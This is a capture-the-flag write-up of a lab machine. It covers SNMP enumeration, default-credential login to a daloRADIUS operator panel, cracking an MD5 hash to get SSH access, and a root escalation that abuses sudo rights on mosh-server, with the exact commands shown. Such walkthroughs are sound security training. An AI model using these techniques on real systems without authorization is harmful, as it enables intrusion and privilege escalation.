# UnderPass

Trying to get back into the saddle with capture the flag style games.

10.10.11.48
Linux
Easy

It's been a minute, lets take a crack at it.

Start with [NMap](/blog/ctfs/notes/nmap) of course.

`> nmap -sC -sV -vv 10.10.11.48`

    #!sh
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
    |   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 
    80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
    | http-methods:
    |_  Supported Methods: POST OPTIONS HEAD GET
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Default Apache HTTP page exists on `http://10.10.11.48`

Directory busting - `/server_status` has a 403 but I think that might be a default thing.

Don't seem to be getting anywhere with this.

Virtual host busting now - nothing there either. using the IP address though so it's not clear.

Lets just try adding `underpass.htb` to the hosts file because usually that's what the host is named.

Still getting back the same default Apache page, lets try the virtual hosts again.

Nope.

The server doesn't seem to host any `DNS` let's do a full port scan.

`> nmap -sS -p- -vv underpass.htb`

    #!sh
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63

Same thing.

Hmm... what about `UDP`?

`> nmap -sU -vv underpass.htb`

    #!sh
    PORT     STATE         SERVICE REASON
    161/udp  open          snmp    udp-response ttl 63
    1812/udp open|filtered radius  no-response
    1813/udp open|filtered radacct no-response


Oh! looks like we have `SNMP` related things? Is that a Hack the Box thing? lets test another IP and see.

Nope

Okay, down the [SNMP](/blog/ctfs/notes/snmp) rabbit hole.

found a useful command `snmpwalk` 

Apparently version 3 of `SNMP` introduces stronger authentication so its always worthwhile to try the weaker versions of the protocol first.

Just for future reference. `SNMP` version 2 and below uses something like a password to protect the data called a `community string` 

For publicly available data, usually that password is something like `public`. You can also find default configurations with `private`. 

`> snmpwalk -v 2c -c public underpass.htb`

    SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
    SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
    DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (4135752) 11:29:17.52
    SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
    SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
    SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas

Looks like we found a username, super useful. This looks like something that could even be found in the wild.

We also found what looks like the name of a service. `daloradius`

Doing a quick search online, that's exactly what it is.

Looking around this github, I found a route `/daloradius/app/users/login.php` which will allow me to log into the application. Maybe from here we can gather the version of the webserver and look for any CVEs.

https://github.com/lirantal/daloradius.git

Tried all the default credentials in the README

Okay, so i was messing around some more. The default creds dont work under `daloradius/app/users/login.php` but it does work under `daloradius/app/operators/login.php` probably because admins are operators or something

anyway

![daloradius-admin](file:///home/parker/Pictures/Screenshots/htb-daloradius.png)

found one user named `svcMosh` 


mosh is like ssh so perhaps its connected to the ssh port. if its the mosh im thinking of... 

the user's MD5 password is seemingly right here in the UI lmao 

cracking 

the MD5 hash was:  `412DD4759978ACFCC81DEAB01B382403` 
the password is: `underwaterfriends` 

okay so using those creds with ssh doesnt seem to do anything. not with `steve` or `svcmosh`

maybe this will come in handy later?

daloradius version `version 2.2 beta / 03 Jul 2024` so maybe no SQLi...

I WAS BEING DUMB. CASE MATTERS

`ssh svcMosh@underpass.htb` with the cracked hash gives us a user on the box. yay~

Okay... after looking through the machine for a few hours, here's what we have.

The first thing to do is check if we straight up have root privs for anything, so `sudo -l` which gives us the interesting path of `/usr/bin/mosh-server`

I will save you the wasted time and effort I made while trying to crack this, but this is kinda sneaky.

the program `mosh` works by running `mosh-client` to interact with ssh, and then through ssh to start `mosh-server` on the remote machine.

if we had `sudo` privs for `mosh` we could just use the `-- [command]` option for escalation, for some reason in the `mosh-server` command that option does not work.

the `mosh` command has an argument called `--server` which is _what I thought was_ a strict path, however it's perfectly valid to supply arguments as well.

Seeing this, there's nothing stopping us from supplying `sudo /usr/bin/mosh-server` for the path.

When running `mosh --server="sudo /usr/bin/mosh-server" localhost` we are dropped into a root shell

nice!